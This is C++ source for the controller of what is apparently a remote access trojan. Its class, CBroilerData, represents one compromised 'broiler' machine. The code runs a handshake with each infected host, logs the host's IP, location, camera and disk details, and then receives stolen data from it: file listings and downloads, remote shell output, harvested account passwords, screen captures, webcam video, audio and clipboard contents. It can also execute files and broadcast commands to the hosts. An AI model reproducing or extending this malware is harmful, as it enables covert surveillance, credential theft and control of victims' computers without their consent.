#include "StdAfx.h"
#include "BroilerData.h"
#include "Common.h"
#include "ModuleSocket.h"

#define CRTDBG_MAP_ALLOC
#include <stdlib.h>
#include <crtdbg.h>

CBroilerData::CBroilerData(UINT id, SOCKET socket, sockaddr_in* serAddr, HWND hWnd)
{
	this->m_nId = id;
	this->m_socket = socket;
	this->m_hWnd = hWnd;
	m_pFileDlg = NULL;
	m_pCmdShellDlg = NULL;
	m_pSystemDlg = NULL;
	m_pChatDlg = NULL;
	m_pScreenDlg = NULL;
	m_pVideoDlg = NULL;
	m_pAudioDlg = NULL;
	m_pRemoteCmdDlg = NULL;
	m_pDesktopDlg = NULL;
	_CrtDumpMemoryLeaks();   //内存泄漏检测
}

CBroilerData::~CBroilerData(void)
{
}

//////////////////////

void CBroilerData::OpenWorkThread()
{
	HANDLE hThread = CreateThread(0, 0, OnListenProc,(LPVOID)this,0, NULL);
	if (NULL != hThread)
	{
		::CloseHandle(hThread);
	}
}

DWORD WINAPI CBroilerData::OnListenProc(LPVOID lpParameter)
{
	CBroilerData* pThis = (CBroilerData*)lpParameter;
	ASSERT(pThis != NULL);
	bool bSuccess = true;  //验证是否成功
    //CString strSingle = _T("BlackYe");
	const char *pSingle = "BlackYe";
	pThis->ShackHandCheck(pSingle, &bSuccess);
	if (bSuccess)
	{
		pThis->OnBeginListen();
	}
	return 0;
}

UINT32 CBroilerData::ShackHandCheck(IN const char* pSingle, OUT bool* pbSuccess )
{
	UINT32 result = ERROR_SUCCESS;
	if (NULL == pSingle || NULL == pbSuccess)
	{
		result = ERROR_INVALID_PARAMETER;
		return result;
	}
	bool bSuccess = true;
	MSGINFO tagMsgInfo;
	memset(&tagMsgInfo, 0, sizeof(MSGINFO));  //初始化
	tagMsgInfo.nMsgCmd = CMD_SHAKEHAND;
	memcpy((char*)tagMsgInfo.context, (char*)pSingle, strlen(pSingle));
	try
	{
		result = m_ModuleSocket.SendCommand(m_socket, (char*)&tagMsgInfo, sizeof(MSGINFO), &bSuccess);  //发送验证信息
		if (ERROR_SUCCESS == result)
		{
			if (bSuccess)
			{
				while (true)
				{
					memset(&tagMsgInfo, 0, sizeof(MSGINFO));
					result = m_ModuleSocket.RecvCommand(m_socket, (char*)&tagMsgInfo, sizeof(MSGINFO), &bSuccess);
					if (bSuccess && CMD_SYSINFO == tagMsgInfo.nMsgCmd)
					{
						SYSTEMINFO sysInfo;
						memset(&sysInfo, 0 , sizeof(SYSTEMINFO));
						memcpy((char*)&sysInfo, (char*)tagMsgInfo.context, sizeof(SYSTEMINFO));
						//验证成功
						m_strWANIP   =  CharToCString(sysInfo.szWANIP);
						m_strLocalIP =  CharToCString(sysInfo.szLocalIP);
						m_strRemark  =  CharToCString(sysInfo.hostName);
						m_strOSVersion = OSVersion(sysInfo.OSVer);
                        //获取物理地址					
						m_strCPU.Format(_T("%s"), sysInfo.szCPUInfo);
						m_QQwry.SetPath(_T("QQwry.dat"));
						CStringA strWANIP = CStrW2CStrA(m_strWANIP);
						CStringA strAddress = m_QQwry.IPtoAdd(strWANIP);
						m_strAddress = CStrA2CStrW(strAddress);
						//获取是否有摄像头
						m_bCam = sysInfo.Cam;
					    //获取硬盘大小
						DWORD dwDiskSize = sysInfo.dwDiskSize;
						m_strDiskSize.Format(_T("%dG"), dwDiskSize);
						//发送上线消息
						::SendMessageW(this->m_hWnd, ID_MSG_ONLINE, (WPARAM)this, 0);   //发送上线信息
						break;
					}
					else
					{
						bSuccess = false;
						throw result;
					}
				}
			}
		}
		else
		{
			bSuccess = false;
			throw result;
		}

	}
	catch (UINT32)
	{
	}
	*pbSuccess = bSuccess;
	return result;
}

void CBroilerData::OnBeginListen()
{
	MSGINFO tagMsgInfo;
	memset(&tagMsgInfo, 0, sizeof(MSGINFO));  //初始化为0

	while (true)  //不断监听服务端是否有命令消息传输过来
	{
		bool bSuccess = true;
		memset((char*)&tagMsgInfo, 0, sizeof(MSGINFO));  //初始化为0
		UINT32 result = m_ModuleSocket.RecvCommand(m_socket, (char*)&tagMsgInfo, sizeof(MSGINFO), &bSuccess);
		memcpy((char*)&tagMsgInfo, (char*)&tagMsgInfo, sizeof(MSGINFO));
// 		if (!bSuccess)
// 		{
// 			if (WSAEWOULDBLOCK == result)
// 			{
// 				Sleep(50);
// 				continue;  //进行下次循环
// 			}
// 			else
// 			{
// 				::closesocket(m_socket);  //关闭socket连接
// 				::SendMessageW(this->m_hWnd, ID_MSG_OFFLINE, this->m_nId, 0);   //发送下线通知
// 				break; //跳出循环
// 			}
// 		}

		if (0 == tagMsgInfo.nMsgCmd) //接收到的是无效命令，则关闭SOCKET连接
		{
			::closesocket(m_socket);  //关闭socket连接
			::SendMessageW(this->m_hWnd, ID_MSG_OFFLINE, this->m_nId, 0);   //发送下线通知
			break; //跳出循环
		}
		else   //成功接收到数据
		{
			switch (tagMsgInfo.nMsgCmd)
			{
			case CMD_DISKINFO:    //系统信息
				{
					DRIVER_C tagDiskInfo = {0};
					//靠！！！拷贝字节数长度错了，造成栈数据溢出崩溃，还有没有王法！！！！！
					memcpy((char*)&tagDiskInfo, (char*)tagMsgInfo.context, sizeof(DRIVER_C));  //赋值给磁盘信息结构体
					m_pFileDlg->GetFileViewPoint()->SetDiskInfo(tagDiskInfo);  //在界面上进行设置
				}
				break;
			case CMD_FILELIST:  //文件列表信息
				{
					FILEINFO_C tagFileInfo;  //文件信息
					memset(&tagFileInfo, 0, sizeof(FILEINFO_C));
					memcpy((char*)&tagFileInfo, (char*)&tagMsgInfo.context, sizeof(FILEINFO_C));
					m_pFileDlg->GetFileViewPoint()->SetFileListInfo(tagFileInfo);
				}
				break;
			case CMD_DOWNLOAD:  //文件下载
				{
					DOWNFILEDATA_C tagDownFileDat;
					memset(&tagDownFileDat, 0, sizeof(DOWNFILEDATA_C));
					memcpy((char*)&tagDownFileDat, (char*)tagMsgInfo.context, sizeof(DOWNFILEDATA_C));
					m_pFileDlg->GetFileTransPoint()->SetFileData(tagDownFileDat);
				}
				break;
			case CMD_FILEEXEC:  //文件执行
				{
					FILEEXECINFO_C tagFileInfo;
					memset(&tagFileInfo, 0, sizeof(FILEEXECINFO_C));
					memcpy((char*)&tagFileInfo, (char*)tagMsgInfo.context, sizeof(FILEEXECINFO_C));
					m_pFileDlg->GetFileViewPoint()->SetFileExecInfo(tagFileInfo);
				}
				break;
			case CMD_REFRESH:  //刷新
				{
					FILEINFO_C tagFileInfo;  //文件信息
					memset(&tagFileInfo, 0, sizeof(FILEINFO_C));
					memcpy((char*)&tagFileInfo, (char*)&tagMsgInfo.context, sizeof(FILEINFO_C));
					m_pFileDlg->GetFileViewPoint()->SetFileListInfo(tagFileInfo);
				}
				break;
			case CMD_ATTRIBUTE:  //属性
				{
					ATTRIBUTE_C tagArrti;
					memset(&tagArrti, 0, sizeof(ATTRIBUTE_C));
					memcpy((char*)&tagArrti, (char*)tagMsgInfo.context, sizeof(ATTRIBUTE_C));
					m_pFileDlg->GetFileViewPoint()->SetArrtibuteInfo(tagArrti);
				}
				break;
			case CMD_TELNET:
				{
					if (NULL == m_pCmdShellDlg)
					{
						break;
					}
					COMMOND_C tagCmdInfo;
					memset(&tagCmdInfo, 0, sizeof(COMMOND_C));
					memcpy((char*)&tagCmdInfo, (char*)tagMsgInfo.context, sizeof(COMMOND_C));
					m_pCmdShellDlg->SetReturnInfo(tagCmdInfo);
				}
				break;
			case CMD_CHATMSG:  //信使服务
				{
					CHATMSG_C tagChatMsg;
					memset(&tagChatMsg, 0, sizeof(CHATMSG_C));
					memcpy((char*)&tagChatMsg, (char*)tagMsgInfo.context, sizeof(CHATMSG_C));
					m_pChatDlg->RecvChatMsg(tagChatMsg);
				}
				break;
			case CMD_PROGRESS:  //获取进程信息
				{
					PROGRESS_C tagProInfo;
					memset(&tagProInfo, 0, sizeof(PROGRESS_C));
					memcpy((char*)&tagProInfo, (char*)tagMsgInfo.context, sizeof(PROGRESS_C));
					((CProgressDlg*)m_pSystemDlg->GeProgressPoint())->SetProcessInfo(tagProInfo);
				}
				break;
			case CMD_GETPWD:  //获取帐号密码
				{
					READPSWDATA_C tagRPDATA;
					memset(&tagRPDATA, 0, sizeof(READPSWDATA_C));
					memcpy((char*)&tagRPDATA, (char*)tagMsgInfo.context, sizeof(READPSWDATA_C));
					((CReadPswDlg*)m_pSystemDlg->GetReadPswPoint())->SetReadPswInfo(tagRPDATA);
				}
				break;
			case CMD_SCREEN:  //获取屏幕信息
				{
					if (NULL == m_pScreenDlg)
					{
						break;
					}
					BMPDATA_C tagBmpData;
					memset(&tagBmpData, 0, sizeof(BMPDATA_C));
					memcpy((char*)&tagBmpData, (char*)tagMsgInfo.context , sizeof(BMPDATA_C));
					m_pScreenDlg->GetScreenDataInfo(tagBmpData);
				}
				break;
			case CMD_VIDEO_VIEW:  //视屏信息
				{
					if (NULL == m_pVideoDlg)
					{
						break;
					}
					VIDEODATA_C tagVideoData;
					memset(&tagVideoData, 0, sizeof(VIDEODATA_C));
					memcpy((char*)&tagVideoData, (char*)tagMsgInfo.context, sizeof(VIDEODATA_C));
					m_pVideoDlg->RecvVideo(tagVideoData);
				}
				break;
			case CMD_AUDIO:  //语音
				{
					if (NULL == m_pAudioDlg)
					{
						break;
					}
					AUDIODATA_C tagAudioData;
					memset(&tagAudioData, 0, sizeof(AUDIODATA_C));
					memcpy((char*)&tagAudioData, (char*)tagMsgInfo.context, sizeof(AUDIODATA_C));
					m_pAudioDlg->RecvAudioData(tagAudioData);
				}
				break;
			case CMD_BROADCAST:  //远程命令广播
				{
					if (NULL == m_pRemoteCmdDlg)
					{
						break;
					}
					wchar_t szContent[512] = {0};
					memcpy((char*)szContent, (char*)tagMsgInfo.context, sizeof(szContent));
					m_pRemoteCmdDlg->UpDateStatusBar(szContent);
				}
				break;
			case CMD_DESKTOP:  //剪贴板
				{
					if (NULL == m_pDesktopDlg)
					{
						break;
					}
				    CLIPBOARD_C tagClipBoard;
					memset(&tagClipBoard, 0, sizeof(CLIPBOARD_C));
					memcpy((char*)&tagClipBoard, (char*)tagMsgInfo.context, sizeof(CLIPBOARD_C));
					m_pDesktopDlg->SetClipBoardContext(tagClipBoard);
				}
				break;
			default:
				break;
			}
		}
	}
}

CString CBroilerData::CharToCString(char* result)
{
	//将char 转换为 CString字符
	DWORD dwNum = MultiByteToWideChar(CP_ACP, 0, result, -1, NULL, 0);
	wchar_t *pwText;
	pwText = new wchar_t[dwNum];
	if (!pwText)
	{
		delete []pwText;
		return NULL;
	}
	MultiByteToWideChar (CP_ACP, 0, result, -1, pwText, dwNum);// 开始转换
	CString cstr = pwText;
	delete pwText;
	return cstr;
}

//
// CStringW转CStringA
//
CStringA CBroilerData::CStrW2CStrA(const CStringW &cstrSrcW)
{
	int len = WideCharToMultiByte(CP_ACP, 0, LPCWSTR(cstrSrcW), -1, NULL, 0, NULL, NULL);
	char *str = new char[len];
	memset(str, 0, len);
	WideCharToMultiByte(CP_ACP, 0, LPCWSTR(cstrSrcW), -1, str, len, NULL, NULL);
	CStringA cstrDestA = str;
	delete[] str;
	return cstrDestA;
}

//
// CStringA转CStringW  Unicode环境下
//
CStringW CBroilerData::CStrA2CStrW(const CStringA &cstrSrcA)
{
	int len = MultiByteToWideChar(CP_ACP, 0, LPCSTR(cstrSrcA), -1, NULL, 0);
	wchar_t *wstr = new wchar_t[len];
	memset(wstr, 0, len*sizeof(wchar_t));
	MultiByteToWideChar(CP_ACP, 0, LPCSTR(cstrSrcA), -1, wstr, len);
	CStringW cstrDestW = wstr;
	delete[] wstr;
	return cstrDestW;
}


CString CBroilerData::OSVersion(IN int sysVer)
{
	CString strOSVersion = _T("");
	switch (sysVer)
	{
	case OS_2000:
		strOSVersion = _T("Windows 2000");
		break;
	case OS_XP:
		strOSVersion = _T("Windows XP");
		break;
	case OS_2003:
		strOSVersion = _T("Windows 2003 Server");
		break;
	case OS_Vista:
		strOSVersion = _T("Windows Vista");
		break;
	case OS_WIN7:
		strOSVersion = _T("Windows 7");
		break;
	case OS_WIN8:
		strOSVersion = _T("Windows 8");
		break;
	case OS_UNKNOWN:
		strOSVersion = _T("未知版本");
		break;
	default:
		break;
	}
	return strOSVersion;
}

//////////////////////////////////////////

//文件管理
void CBroilerData::RunToFileManager()
{
	if (NULL == m_pFileDlg)
	{
		m_pFileDlg = new CFileManager(this, m_socket);
		m_pFileDlg->Create(IDD_DLG_FILE, this);
		m_pFileDlg->ShowWindow(SW_NORMAL);
	}
	else
	{
		m_pFileDlg->SetActiveWindow();  //设置活动页面
	}
}

void CBroilerData::RunToScreenManager()
{
	if (NULL == m_pScreenDlg)
	{
		m_pScreenDlg = new CScreenDlg(this, m_socket);
		m_pScreenDlg->Create(IDD_DLG_SCREEN, this);
		m_pScreenDlg->ShowWindow(SW_NORMAL);
	}
	else
	{
		m_pScreenDlg->SetActiveWindow();  //设置活动页面
	}
}

//系统管理(进程、服务)
void CBroilerData::RunToSystemManager()
{
	if (NULL == m_pSystemDlg)
	{
		m_pSystemDlg = new CSystemManager(this, m_socket);
		m_pSystemDlg->Create(IDD_DLG_SYSTEM, this);
		m_pSystemDlg->ShowWindow(SW_NORMAL);
	}
	else
	{
		m_pSystemDlg->SetActiveWindow();  //设置活动页面
	}
}

//远程终端
void CBroilerData::RunToCMDShellManager()
{
	if (NULL == m_pCmdShellDlg)
	{
		m_pCmdShellDlg = new CCmdShell(this, m_socket, m_strLocalIP);
		m_pCmdShellDlg->Create(IDD_DLG_TELNET, this);
		m_pCmdShellDlg->ShowWindow(SW_NORMAL);
	}
	else
	{
		m_pCmdShellDlg->SetActiveWindow();  //设置活动页面
	}
}

//摄像头
void CBroilerData::RuntToVideoManager()
{
	if (NULL == m_pVideoDlg)
	{
		m_pVideoDlg = new CVideoDlg(this, m_socket);
		m_pVideoDlg->Create(IDD_DLG_VIDEO, this);
		m_pVideoDlg->ShowWindow(SW_NORMAL);
	}
	else
	{
		m_pVideoDlg->SetActiveWindow();  //设置活动页面
	}
}

//主界面右键菜单

//信使服务
void CBroilerData::RunToChatMsgManager()
{
	if (NULL == m_pChatDlg)
	{
		m_pChatDlg = new CChatDlg(this, m_socket, m_strLocalIP);
		m_pChatDlg->Create(IDD_DLG_CHAT, this);
		m_pChatDlg->ShowWindow(SW_NORMAL);
	}
	else
	{
		m_pChatDlg->SetActiveWindow();  //设置活动页面
	}
}

void CBroilerData::RunToOperatorManager(IN const int nType)
{
	OPERATOR_C tagOperator;
	memset(&tagOperator, 0, sizeof(OPERATOR_C));
	tagOperator.nType = nType;  //操作类型

	MSGINFO tagMsgInfo;
	memset(&tagMsgInfo, 0, sizeof(MSGINFO));
	tagMsgInfo.nMsgCmd = CMD_OPERATOR;
	memcpy((char*)tagMsgInfo.context, (char*)&tagOperator, sizeof(OPERATOR_C));
	bool bSuccess = true;
	m_ModuleSocket.SendCommand(m_socket, (char*)&tagMsgInfo, sizeof(MSGINFO), &bSuccess);
}

void CBroilerData::RunToAudioManager()
{
	if (NULL == m_pAudioDlg)
	{
		m_pAudioDlg = new CAudioDlg(this, m_socket);
		m_pAudioDlg->Create(IDD_DLG_AUDIO, this);
		m_pAudioDlg->ShowWindow(SW_NORMAL);
	}
	else
	{
		m_pAudioDlg->SetActiveWindow();  //设置活动页面
	}
}

void CBroilerData::RunToRemoteCmdManager()
{
	if (NULL == m_pRemoteCmdDlg)
	{
		m_pRemoteCmdDlg = new CRemoteCmdDlg(this, m_socket);
		m_pRemoteCmdDlg->Create(IDD_DLG_BROADCAST, this);
		m_pRemoteCmdDlg->ShowWindow(SW_NORMAL);
	}
	else
	{
		m_pRemoteCmdDlg->SetActiveWindow();  //设置活动页面
	}
}

void CBroilerData::RunToDesktopManager()
{
	if (NULL == m_pDesktopDlg)
	{
		m_pDesktopDlg = new CDesktopDlg(this, m_socket, m_strLocalIP);
		m_pDesktopDlg->Create(IDD_DLG_DESKTOP, this);
		m_pDesktopDlg->ShowWindow(SW_NORMAL);
	}
	else
	{
		m_pDesktopDlg->SetActiveWindow();  //设置活动页面
	}
}
